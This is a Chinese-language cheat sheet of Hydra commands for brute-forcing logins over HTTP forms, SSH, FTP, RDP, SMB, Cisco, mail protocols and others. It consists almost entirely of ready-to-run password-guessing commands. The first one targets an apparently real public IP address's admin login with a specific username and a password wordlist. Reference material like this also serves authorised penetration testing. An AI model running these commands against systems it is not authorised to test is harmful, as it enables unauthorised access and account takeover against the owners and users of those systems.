## hydra九头蛇：暴力破解工具
hydra是一个支持众多协议的爆破工具。<br>

**参数详解**<br>



### 1、破解http post:
```shell
hydra -t 10 -l vaccigen -P /opt/fuzzDicts-master/passwordDict/top6000.txt -o out.txt -f -vV 52.196.234.51 http-post-form "/admin/index.php:account=^USER^&password=^PASS^:error" 
```
### 2、破解http get:
```shell
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
```
### 3、破解https:
```shell
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 
```
### 4、破解ssh:
```shell
hydra 192.168.56.12 ssh -l user -P /root/Work/sshpasswd.list -t 6 -V -f
```
### 5、破解ftp:
```shell
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 
```
### 6、破解teamspeak： 
```shell
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 
```
### 7、破解cisco： 
```shell
hydra -P pass.txt 10.36.16.18 cisco 
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 
```
### 8、破解smb： 
```shell
hydra -l administrator -P pass.txt 10.36.16.18 smb 
```
### 9、破解pop3： 
```shell
hydra -l muts -P pass.txt my.pop3.mail pop3 
```
### 10、破解rdp： 
```shell
hydra ip rdp -l administrator -P pass.txt -V 
```
### 11、破解http-proxy： 
```shell
hydra -l admin -P pass.txt http-proxy://10.36.16.18 
```
### 12、破解imap: 
```shell
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN 
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```
